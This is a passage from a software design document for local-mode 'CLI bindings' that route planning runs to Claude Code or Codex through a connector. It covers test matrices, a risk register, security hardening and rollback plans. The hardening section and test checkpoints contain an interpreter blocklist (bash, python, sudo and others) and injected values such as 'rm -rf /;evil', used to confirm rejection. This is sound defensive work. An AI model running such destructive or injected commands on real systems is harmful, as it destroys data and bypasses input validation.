- T-S2-4: run created without `account_binding_id` AND user has zero cli:* bindings → snapshot stays empty (backwards compat).
- T-S2-5: cross-user binding-id submission → 400 (R2).
- T-S2-6: pre-Path-B connector (protocol_version=0) tries to claim a run with `account_binding_id` → returns "no run"; user gets warning notification.
- T-S2-7: Path-B connector (protocol_version=1) claims same run → success.
- T-S2-8: connector daemon decoder accepts an unknown future field in claim response without erroring.
- T-S2-9: stdin envelope at exactly 264 KiB → spawned; at 264 KiB + 1 byte → adapter_protocol_error.
- T-S2-10: stale `cli_health` (`checked_at` > 10 min ago, 2× the 5-min probe) on chosen binding → response envelope includes `stale_cli_health` warning.
- T-S2-11: binding deleted between claim and submit → snapshot still preserves the audit info; result writes back successfully.
- T-S2-12: integration test full create-run → claim → submit-result with two distinct bindings produces two distinct adapter invocations.
- T-S2-13: rollback migration drops both new columns + index under both drivers.

**Size**: L (revised up from M in v1). Largest backend slice. ~400 LOC backend + 60 LOC adapter + 2 migrations + 2 doc updates + 13 tests.

**Slice may need to split**: if `account_binding_id` + protocol-version gating + envelope cap together push the PR past 600 LOC, split into S2a (account_binding_id + snapshot) and S2b (protocol-version + envelope-cap + backwards-compat warnings). Decide at implementation time.

### S3 — Frontend: CLI binding management UI

**Scope**:
- Extend `pages/AccountBindings.tsx` with new "CLI bindings" section.
- LocalMode-only gate: in server mode, show info card "CLI bindings unavailable in server mode" (D8).
- Add-CLI-binding form with provider preset cards (Claude Code / Codex). Codex card has "Untested by maintainer" annotation (D5).
- Form posts to `POST /api/me/account-bindings`.
- `is_primary` checkbox (default checked when creating first binding of a namespace).
- "Switch to this binding" button on inactive same-provider rows (D6 workaround for multi-install).
- Delete CLI binding works (existing endpoint).
- New helper `frontend/src/utils/cliBindingPresets.ts` (Claude + Codex defaults).

**Definition of Done — explicit test matrix**:
- T-S3-1: render in local mode → CLI bindings section shown.
- T-S3-2: render in server mode → info card shown, no form (mock LocalMode=false).
- T-S3-3: render with empty CLI bindings → form expanded.
- T-S3-4: render with one CLI binding → list + collapsed form.
- T-S3-5: submit form with valid Claude binding → POST fires with expected payload; UI refreshes.
- T-S3-6: submit form with empty model_id → blocked client-side.
- T-S3-7: delete binding → confirmation modal → DELETE fires → row gone.
- T-S3-8: switch primary → PATCH fires; UI updates.

**Size**: M. ~250 LOC TSX + 1 utility file + 8 smoke tests.

### S4 — Frontend: CLI binding picker in PlanningLauncher

**Scope**:
- New `frontend/src/pages/ProjectDetail/planning/CliBindingPicker.tsx` component.
- `PlanningLauncher.tsx` shows picker when `execution_mode == local_connector` AND user has ≥1 CLI binding.
- Picker uses `cli_health` from server (queried via existing `GET /api/me/local-connectors`).
- Default selection: primary `cli:*` binding for the run's resolved adapter type.
- Hidden when zero CLI bindings (backwards compat).
- Submit POSTs `account_binding_id`.
- Shows soft warning chip if response envelope contains `stale_cli_health`.

**Definition of Done — explicit test matrix**:
- T-S4-1: render with one healthy primary binding → picker shows, defaults to primary.
- T-S4-2: render with one expired binding → picker shows status badge ⚠.
- T-S4-3: render with stale (>10 min) health → "?" badge.
- T-S4-4: render with zero CLI bindings → picker absent (backwards compat).
- T-S4-5: select alternate binding + submit → POST includes correct `account_binding_id`.
- T-S4-6: pre-Path-B connector + run with binding → submit succeeds but warning notification appears (handled by S2's notification path; verify notification renders).
- T-S4-7: stale-health warning chip shown when API returns `stale_cli_health` warning.

**Size**: S. ~120 LOC TSX + 1 new sibling + 7 smoke tests.

### S5a — Server-side error_kind catalog + persistence

**Scope**:
- `submit-result` accepts `error_kind` enum (no `remediation_hint` from adapter — D7).
- Server validates against enum; stores in `connector_cli_info.error_kind`.
- Static Go map for `error_kind → remediation_hint` (per D7 catalog).
- Failure flash banner in `CandidateReviewPanel.tsx` renders the server-rendered hint with "Suggested next step:" prefix.
- Unknown `error_kind` → falls back to monospace `error_message` block (no hint).
- API surface doc updated.

**Definition of Done — explicit test matrix**:
- T-S5a-1: submit-result with `error_kind: "session_expired"` → stored; UI shows hint.
- T-S5a-2: submit-result with `error_kind: "unknown"` → stored; UI shows raw error_message block, no hint.
- T-S5a-3: submit-result with `error_kind: "<not in enum>"` → server normalizes to `unknown`.
- T-S5a-4: submit-result without `error_kind` → server defaults to `unknown` (backwards compat with pre-S5a adapters).
- T-S5a-5: hint catalog has entry for every enum value except `unknown`.
- T-S5a-6: UI cannot render adapter-supplied free-text hint (regression test against the v1 phishing risk).

**Size**: S. ~100 LOC backend + 50 LOC frontend + 6 tests.

### S5b — Adapter classifier + connector health probe + UI badges

**Scope**:
- Adapter (`backlog_adapter.py`) classifies CLI failures into the 7 enum values per §6.4 table.
- Connector `serve` adds health probe: `<cli_command> --version` per probe interval (default 5 min, configurable).
- Probe failures classified separately from real-run errors (R8) — only sets `cli_health.status`, never impersonates a real-run `error_kind`.
- Heartbeat extended to send `cli_health[]`.
- Server stores in `local_connectors.metadata.cli_health.<binding_id>`.
- Connector flag `--cli-health-disabled` skips probing (R9 quota concern).
- Connector flag `--cli-health-interval=<seconds>` (default 300, range 60–3600).
- AccountBindings rows show health badge with relative timestamp (S3 + S5b composition).
- Picker (S4) reads same source.
- On binding delete: scrub `cli_health` JSONB key for all the user's connectors (R12 / D3).

**Definition of Done — explicit test matrix**:
- T-S5b-1: adapter unit tests for each of 7 `error_kind` classifications (English signatures).
- T-S5b-2: adapter receives non-English stderr → returns `unknown`.
- T-S5b-3: probe with cli_command pointing at a real binary returns `version_string`.
- T-S5b-4: probe with cli_command pointing at non-existent path → `status: cli_not_found`.
- T-S5b-5: probe with cli_command resolving to interpreter binary (e.g. /bin/bash) → connector REFUSES (§10 hardening) — NOT spawned, status: cli_not_found, probe_error_message: "interpreter binary not allowed".
- T-S5b-6: heartbeat persists cli_health; subsequent GET reflects it.
- T-S5b-7: binding deleted → server scrubs the corresponding cli_health entry across all the user's connectors.
- T-S5b-8: AccountBindings UI shows "checked Ns ago" relative timestamp; renders "?" when >10 min.

**Size**: M. ~150 LOC adapter + ~120 LOC connector + ~80 LOC frontend + 8 tests.

### Dependency graph (v2 — corrected)

```
S1 (data model + LocalMode gate)
  ├── S2 (per-run plumbing + protocol version)
  │     ├── S4 (launcher picker)
  │     │     └── S5b (adapter classifier + health probe + badges)
  │     └── S5a (server-side catalog + render)
  │             └── (S5b also depends on S5a for the enum + render path)
  └── S3 (binding mgmt UI)
        └── S5b (binding rows show health — S3 must exist first)
```

Effective ordering: **S1 → S2 → (S3, S5a in parallel) → S4 → S5b**.

S3 and S5a are the only true parallels.

## 9. Risk register (v2 — expanded)

| # | Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|---|
| R1 | CLI binary path execution surface | Low (local mode only per D8) | High in server mode (mitigated by D8 gate); Medium in local mode | D8 gates Path B to LocalMode; connector-side `realpath` + allowed-roots + interpreter blocklist + setuid rejection (§10); regex sanity check at API; subprocess invoked with `shell=False` (already enforced) |
| R2 | Cross-user binding-id confused-deputy in server mode | Theoretical (D8 gates) | High if D8 ever lifted | Three-way ownership check at run creation; documented in §6.2; explicit T-S2-5 negative test |
| R3 | Old connector silently runs against wrong CLI | Medium (during transition) | High | `protocol_version` column + dispatch refusal + warning notification; T-S2-6 / T-S2-7 |
| R4 | `error_kind` enum becomes wrong as CLIs evolve | Medium | Low | Adapter classifier conservative — `unknown` is the safe fallback; new enum values require DECISIONS entry; locale caveat documented (English only) |
| R5 | Adapter stdin grows past size cap | Low | Medium | 264 KiB envelope cap enforced in connector before spawn; `configured_models` capped at 16×64 chars (S1); T-S2-9 boundary test |
| R6 | User schedules planning runs but no connector is online | Medium | Low | Existing behavior — run sits queued; surfaced in planning-run list |
| R7 | (Reserved — was R7 in v1, replaced by R3 above and snapshot TX in §6.5) | — | — | — |
| R8 | Health probe creates self-inflicted feedback loop | Low (v2 fix) | Low | v2: probe is `--version` only (no LLM call); probe failures CANNOT set real-run `error_kind` (separate path); T-S5b-3..5 |
| R9 | Health probe consumes user's CLI quota | Negligible (v2 fix) | Low | v2: `--version` only, no quota cost; configurable interval (default 5 min, was 60s); `--cli-health-disabled` opt-out |
| R10 | Deleting binding while run is in flight | Low | Medium | Snapshot in `connector_cli_info` preserves audit; FK-less reference allows deletion; T-S2-11 |
| R11 | Stale `cli_health` misleads operator | High | Low | "?" indicator for >10-min stale; envelope warning at run creation when picked binding is stale; T-S2-10 / T-S4-3 |
| R12 | JSONB key collision in `local_connectors.metadata` | Low | High | `cli_health` namespace reserved; typed store helpers; cleanup on binding delete |
| R13 | `binding_label` column already used; new code overwrites with wrong value | Low | Medium | v2: only WRITE `binding_label` when binding source is personal; mirror existing 015 behavior; reuse, not overwrite |
| R14 | LOC budgets are optimistic; PRs balloon | Medium | Low | Slice sizes revised up in v2; S2 may split into S2a / S2b |
| R15 | Codex CLI behaves differently from Claude | Medium | Medium | Adapter unit tests for both CLIs; D5 acknowledges Codex untested; Codex preset card marked "Untested by maintainer" |
| R16 | DECISIONS allowlist drift (cli:* values added without DECISIONS entry) | Low | Low | CI grep rule (S1 PR adds): if `handlers/account_bindings.go` allowlist set changes without `DECISIONS.md` diff in same PR → fail |

## 10. Security analysis (v2 — hardened)

The CLI bridge is a **subprocess invocation surface**. Path B intentionally restricts this surface to local mode (D8) where the connector + web app + filesystem are on the same operator-owned machine.

### Threat model

**Local mode (Path B in scope)**:
- The connector runs as the operator's user. It already has full filesystem + network access of that user.
- The web app on `localhost` is reachable only from the operator's machine.
- `cli_command` is set by the same operator who runs the binary directly. Not a privilege-escalation surface.
- Hardening still required to prevent **footgun** scenarios (operator misconfigures `cli_command` and accidentally runs the wrong binary).

**Server mode (Path B explicitly out of scope per D8)**:
- The web app accepts authenticated requests from multiple users.
- Each user's `cli_command` would be attacker-controlled binary execution under the connector host's identity.
- Mitigations needed (admin allowlist, sandboxing) are out of scope for Path B; defer to a separate design.

### Local-mode hardening (S1 + S2 + S5b enforce together)

**Server-side validation (S1)**:
- `cli_command` regex: `^/[A-Za-z0-9_./\-]+$`. Sanity check only — reject empty, relative paths, shell metacharacters. Server cannot validate filesystem state of the connector host.
- D8 gate: `provider_id LIKE 'cli:%'` rejected with 403 if `LocalMode=false`.

**Connector-side validation (S2 + S5b — load-bearing)**:
- On adapter spawn AND on health probe:
  1. `realpath(cli_command)` to resolve symlinks.
  2. Reject if resolved path is outside allowed roots: `/usr`, `/usr/local`, `/opt`, `$HOME/.local/bin`, `$HOME/bin`, `$HOME/.cargo/bin` (configurable via `--cli-allowed-roots`).
  3. Reject if `basename(realpath)` is in the **interpreter blocklist**: `sh`, `bash`, `zsh`, `fish`, `python`, `python3`, `node`, `ruby`, `perl`, `env`, `xargs`, `sudo`, `doas`.
  4. Reject if `os.stat(realpath).st_mode & (S_ISUID | S_ISGID)` (no setuid/setgid).
  5. Reject if not executable for current uid.
- Fail-closed: any rejection → status `cli_not_found` with `probe_error_message` populated.

**Subprocess invocation discipline**:
- `subprocess.run([cli_command, ...args])` only. `shell=True` is **forbidden**.
- CI lint check: `grep -rn 'shell=True' adapters/` MUST be empty (added to S5b PR).

**Argv discipline**:
- Adapter passes `cli_selection.model_id` ONLY after whitelisting against `binding.configured_models`.
- Adapter does NOT forward arbitrary args from the binding row to the CLI (no `extra_args` field on `cli_selection`). Future expansion to allow controlled args (e.g. `--max-tokens`) requires a DECISIONS entry naming the allowed flag set.

**Audit trail**: every CLI invocation logged in `agent_runs.metadata`:
```jsonc
{
  "account_binding_id": "uuid",
  "binding_label": "My Mac Claude",
  "binding_provider_id": "cli:claude",
  "cli_command_resolved": "/usr/local/bin/claude",   // post-realpath
  "cli_model_id": "claude-sonnet-4-6",
  "cli_exit_code": 0,
  "cli_duration_ms": 4521,
  "error_kind": "",
  "local_connector_id": "uuid",                       // R6 in risk-reviewer findings
  "connector_token_fingerprint": "sha256:..."         // first 12 chars; for revocation traceability
}
```

NEVER logs verbatim stdout/stderr; NEVER logs the planning context body (already redacted by `wire.SanitizePlanningContextV1`).

### Authentication / authorization

- `POST /api/me/account-bindings` — existing session/API-key middleware applies.
- `account_binding_id` in run-create — three-way ownership check (binding.user_id == requester == requirement.project.owner).
- At claim time — connector.user_id == run.requested_by_user_id (existing); plus connector.user_id == binding_snapshot.user_id (added in v2 — defense-in-depth even though D8 makes this mostly impossible).

### Negative tests (codified in S1 + S2 + S5b DoDs)

- T-S1-3: cli:* in server mode → 403.
- T-S1-4: regex rejection of `;evil`.
- T-S1-5: configured_models > 16 entries → 400.
- T-S2-5: cross-user binding-id → 400.
- T-S2-9: stdin envelope > 264 KiB → adapter_protocol_error.
- T-S5b-5: cli_command resolving to interpreter binary → connector refuses, no subprocess spawned.
- T-S5a-6: UI cannot render adapter-supplied free-text hint (D7 phishing regression test).

## 11. Observability + audit trail

For each `local_connector` planning run, `agent_runs.metadata` is populated per §10 spec.

`agent_runs.summary` example:
```
"Planning via cli:claude (binding: My Mac Claude, model: claude-sonnet-4-6, exit=0, 4.5s)"
```

### Quota / cost of health probes

- Probe interval: 5 min default (configurable `--cli-health-interval`, range 60–3600s; v2 raised default from 60s).
- Probe payload: `<cli_command> --version` — no LLM call, no token cost.
- Disable via `--cli-health-disabled`; UI then shows "Health checks disabled by connector".

## 12. UX wireframes (text)

### 12.1 AccountBindings page after S3 + S5b (local mode)

```
═══════════════════════════════════════════════════════════════
  My Bindings
═══════════════════════════════════════════════════════════════

  API-key bindings                    [+ Add API-key binding]
  ─────────────────────────────────────────────────────────────
  • My Mistral
    Provider: openai-compatible (Mistral)
    Model: mistral-small-latest    Status: ● active · Primary
    [Disable] [Delete]
  ─────────────────────────────────────────────────────────────

  CLI bindings (local mode)             [+ Add CLI binding]
  ─────────────────────────────────────────────────────────────
  • My Mac Claude                       ● active · Primary
    Provider: cli:claude    Model: claude-sonnet-4-6
    Health: ✓ healthy (claude 1.5.0, checked 12s ago)
    Connector: My Mac
    [Disable] [Delete]

  • Old Codex                           ⚪ inactive
    Provider: cli:codex    Model: gpt-5.4
    [Switch to this binding]
    [Delete]
  ─────────────────────────────────────────────────────────────
```

### 12.2 AccountBindings page in server mode (D8)

```
═══════════════════════════════════════════════════════════════
  My Bindings
═══════════════════════════════════════════════════════════════

  API-key bindings                    [+ Add API-key binding]
  ─────────────────────────────────────────────────────────────
  • My Mistral
    ...
  ─────────────────────────────────────────────────────────────

  ┌─ ⓘ CLI bindings ─────────────────────────────────────────┐
  │ CLI bindings are only available in local-mode             │
  │ deployments. They let you route planning runs to a Claude │
  │ Code or Codex CLI on the same machine without sharing an  │
  │ API key. Server-mode support is a future design.          │
  └────────────────────────────────────────────────────────────┘
```

### 12.3 Add-CLI-binding form (S3)

```
  ┌─ Add CLI binding ─────────────────────────────────────────┐
  │  Choose CLI:                                               │
  │  ┌───────────────────┐  ┌───────────────────────────────┐ │
  │  │ ● Claude Code     │  │ ◯ Codex                       │ │
  │  │   Anthropic CLI   │  │   OpenAI CLI                  │ │
  │  │                   │  │   (Untested by maintainer)    │ │
  │  └───────────────────┘  └───────────────────────────────┘ │
  │                                                            │
  │  Label:           [My Mac Claude                       ]  │
  │  Model id:        [claude-sonnet-4-6                   ]  │
  │  Configured models (≤16):                                  │
  │                   [claude-sonnet-4-6, claude-opus-4-7  ]  │
  │  CLI command (optional, leave empty for PATH lookup):      │
  │                   [/usr/local/bin/claude               ]  │
  │  ☑ Set as primary CLI binding                              │
  │                                                            │
  │  [Cancel]                                       [Create]   │
  └────────────────────────────────────────────────────────────┘
```

### 12.4 PlanningLauncher CLI picker (S4)

```
  ┌─ New planning run ────────────────────────────────────────┐
  │  Requirement:  Improve sync recovery UX                    │
  │                                                            │
  │  Execution mode:                                           │
  │    ◯ Built-in fallback (deterministic)                    │
  │    ◯ Mistral (server provider)                            │
  │    ● Local CLI                                             │
  │       └─ CLI binding:                                      │
  │          [My Mac Claude (✓ healthy)            ▾]         │
  │             My Mac Claude     ✓ healthy · Primary          │
  │             Old Codex         ⚪ inactive — switch first   │
  │                                                            │
  │  ⚠ Health for "My Mac Claude" was last checked 8 min ago. │
  │                                                            │
  │  [Cancel]                                  [Run planning]  │
  └────────────────────────────────────────────────────────────┘
```

### 12.5 Failure flash banner (S5a)

```
  ┌─ Planning run failed ─────────────────────────────────────┐
  │  ⚠ Run on requirement "Improve sync recovery UX" failed.  │
  │                                                            │
  │  Reason:               CLI session expired                │
  │  Suggested next step:  Run `claude login` on the           │
  │                        connector host, then retry.        │
  │                                                            │
  │  [View details]                            [Retry run]    │
  └────────────────────────────────────────────────────────────┘
```

When `error_kind == "unknown"`:

```
  ┌─ Planning run failed ─────────────────────────────────────┐
  │  ⚠ Run on requirement "Improve sync recovery UX" failed.  │
  │                                                            │
  │  Raw error:                                                │
  │  ┌────────────────────────────────────────────────────────┐│
  │  │ claude CLI failed (exit 1): some unrecognized error    ││
  │  └────────────────────────────────────────────────────────┘│
  │                                                            │
  │  [View details]                            [Retry run]    │
  └────────────────────────────────────────────────────────────┘
```

(Monospace block, no "Suggested next step:" — telegraphs to operator that this is uninterpreted output.)

## 13. Migration / rollback strategy (v2 — concrete)

**Forward-only migrations** (existing project policy):
- `021_account_bindings_cli_extensions.sql` (S1) — adds `cli_command`, `is_primary`, partial unique index.
- `022_planning_runs_account_binding_id.sql` (S2) — adds `account_binding_id` + index.
- `023_local_connectors_protocol.sql` (S2) — adds `protocol_version`.

**No `IF NOT EXISTS` on ALTER ADD COLUMN** — relies on the migration runner's `schema_migrations` table for idempotency (SQLite limitation per critic finding 6).

**Each migration ships with a sibling `*.down.sql`** for development-only rollback (NOT applied in production). Rollback discipline:

| Slice | Pre-merge revert | Post-merge rollback (dev only) |
|---|---|---|
| S1 | `git revert` clean — no production users | `021.down.sql`: `DROP INDEX idx_account_bindings_primary_unique`; `ALTER TABLE account_bindings DROP COLUMN cli_command`; `ALTER TABLE account_bindings DROP COLUMN is_primary`. SQLite: `modernc.org/sqlite >= 1.30` supports `DROP COLUMN` since SQLite 3.35; the project tracker pin should confirm. |
| S2 | `git revert` clean | `022.down.sql`: `DROP INDEX idx_planning_runs_account_binding`; `ALTER TABLE planning_runs DROP COLUMN account_binding_id`. `023.down.sql`: `ALTER TABLE local_connectors DROP COLUMN protocol_version`. |
| S3 | `git revert` clean | Frontend revert; no data cleanup. |
| S4 | `git revert` clean | Frontend revert; no data cleanup. |
| S5a | `git revert` clean | `error_kind` lives inside `connector_cli_info` JSON — no schema change needed; runtime falls back to truncated `error_message`. |
| S5b | `git revert` clean | Stop probing; `local_connectors.metadata.cli_health` keys harmless; can be scrubbed via maintenance script if desired. |

**CI runs the down path** under both drivers as part of S1 / S2 PRs (test fixture: apply → migrate down → re-apply).

## 14. Out of scope references

- **Copilot CLI / VS Code session extraction**
- **Cross-connector capability routing**
- **Cost / token accounting**
- **Auto-retry of failed runs**
- **OAuth-style in-app CLI login**
- **Per-project CLI bindings**
- **Cross-user CLI binding sharing**
- **Sandboxed CLI execution**
- **CLI bindings in server mode (D8)** — explicitly out for v2; future design needed
- **Multi-active bindings per provider (was v1 D6)** — dropped per existing index 015

## 15. Status tracking

| Slice | Status | PR | Merged |
|---|---|---|---|
| Design v1 (this doc, initial draft) | superseded | #14 (was draft) | — |
| Design v2 (this doc, current) | in review | #14 | — |
| S1 — data model + LocalMode gate | not started | — | — |
| S2 — per-run plumbing + protocol version | not started | — | — |
| S3 — binding mgmt UI | not started | — | — |
| S4 — launcher picker | not started | — | — |
| S5a — server-side error_kind catalog | not started | — | — |
| S5b — adapter classifier + health probe | not started | — | — |

## 16. Implementation checkpoints (between slices)

**After S1**:
- `curl -X POST /api/me/account-bindings -d '{"provider_id":"cli:claude","label":"test","model_id":"claude-sonnet-4-6"}'` returns 201 in local mode.
- Same `curl` returns 403 in server mode (D8).
- `cli_command: "rm -rf /;evil"` returns 400.

**After S2**:
- Create planning run via API with `account_binding_id` → run row has snapshot.
- Pre-Path-B connector tries to claim → returns "no run"; warning notification fires.
- Path-B connector claims successfully.
- Cross-user binding submission → 400.

**After S3**:
- AccountBindings shows new "CLI bindings" section in local mode.
- In server mode, info card shown instead.
- Add Claude binding via UI works.

**After S4**:
- Launcher shows CLI picker.
- Submit creates run with chosen `account_binding_id`.

**After S5a**:
- Trigger intentional CLI failure → server-rendered "Suggested next step:" hint shown.
- Run with `error_kind: "unknown"` → raw error_message in monospace block, no hint.

**After S5b**:
- Heartbeat carries `cli_health[]`; UI rows show health badges.
- Probe with `cli_command` pointing at `/bin/bash` is refused.
- `--cli-health-disabled` flag works.

## 17. Glossary

- **CLI binding** — a per-user `account_bindings` row with `provider_id LIKE 'cli:*'`. Available only in local mode (D8).
- **Primary CLI binding** — the `is_primary=true` row in `(user_id, namespace='cli')` group. Used as default when run is created without explicit `account_binding_id`.
- **Snapshot** — JSON sub-block inside `connector_cli_info.binding_snapshot` containing `provider_id`, `model_id`, `cli_command`, `label`, `is_primary` at run-creation time. Decouples run from later binding edits / deletion.
- **`error_kind`** — typed enum classifying adapter failure (`session_expired`, `rate_limited`, `model_not_available`, `cli_not_found`, `cli_timeout`, `adapter_protocol_error`, `unknown`).
- **`cli_health`** — connector-reported per-binding probe status (`healthy`, `cli_not_found`, `unknown`). Stored under `local_connectors.metadata.cli_health.<binding_id>`. Probe-only — does NOT impersonate run-level `error_kind` values.
- **Protocol version** — integer stored on `local_connectors`; `0` = pre-Path-B connector that doesn't understand `cli_binding` in claim response, `1` = Path B / S2-aware.
- **Allowed roots** — list of filesystem prefixes a `cli_command` resolved path must live under (e.g. `/usr`, `/usr/local`, `$HOME/.local/bin`); configurable via connector flag.
- **Interpreter blocklist** — list of binary basenames the connector refuses to spawn even if path-allowlisted (`sh`, `bash`, `python`, `node`, `sudo`, etc.).

## 18. v2 changelog (vs v1)

Addressed critic + risk-reviewer findings on the v1 draft:

1. **D6 dropped** — multi-active bindings per provider conflicts with existing `idx_account_bindings_active_unique` (migration 015). Aligned with the index instead.
2. **Reconciled with existing migrations 018 / 019** — `adapter_type`, `model_override`, `connector_cli_info` were already in `planning_runs`. v2 reuses them instead of adding `cli_binding_id` + `cli_binding_snapshot` + `error_kind` + `remediation_hint` as new columns. Net new columns reduced from 4 to 1 (`account_binding_id`).
3. **D8 added** — Path B is gated to local mode. Server-mode CLI execution surface needs a separate design with admin allowlist + interpreter denylist + sandboxing.
4. **D7 added** — `remediation_hint` is server-side catalog, not adapter-supplied free text. Closes phishing channel.
5. **D2 revised** — primary binding is explicit `is_primary BOOLEAN`, not "most-recently-updated_at". Fixes race (concurrent runs touch updated_at, failed runs don't update).
6. **§10 hardening** — `cli_command` validation moved primarily to connector-side: `realpath` + allowed-roots + interpreter blocklist + setuid rejection. Server-side regex demoted to sanity check.
7. **§6.2 R3 mitigation** — `protocol_version` column on `local_connectors`; server refuses to dispatch CLI-bound runs to pre-Path-B connectors; warning notification fires.
8. **§6.5 snapshot in single TX** — explicit transaction boundary documented.
9. **§6.4 health probe in v2** — `--version` only, no LLM call, no token cost; default interval raised to 5 min; probe failures classified separately from real-run errors (R8 fix).
10. **Slice graph corrected** — S5 split into S5a (server catalog) + S5b (adapter classifier + health UX). S5b depends on both S4 and S3.
11. **Per-slice DoD made into explicit test matrix** — replaced "8+ tests" with named test IDs (T-S1-1, T-S2-5, etc.) covering negative cases the v1 draft hand-waved.
12. **§13 rollback story made concrete** — sibling `.down.sql` migrations; `cli_health` JSONB scrub on binding delete; CI runs down path under both drivers.
13. **§5 D1 — CI rule for allowlist drift** — `cli:*` provider allowlist changes require paired `DECISIONS.md` diff (R16).
14. **§9 R5 / R7 envelope cap** — connector enforces 264 KiB stdin envelope cap before spawn; `configured_models` capped at 16×64 chars at API.
15. **§11 audit trail expanded** — `local_connector_id` + `connector_token_fingerprint` added to per-run metadata for incident response (R6 in risk-reviewer findings).

---

Source: `[agent:feature-planner]`. Cites `subscription-connector-mvp.md`, `local-connector-context.md`, `credential-binding-design.md`. Eight design decisions resolved per §5. Reviewed by critic and risk-reviewer agents; their findings folded into v2. No code lands until owner approval.
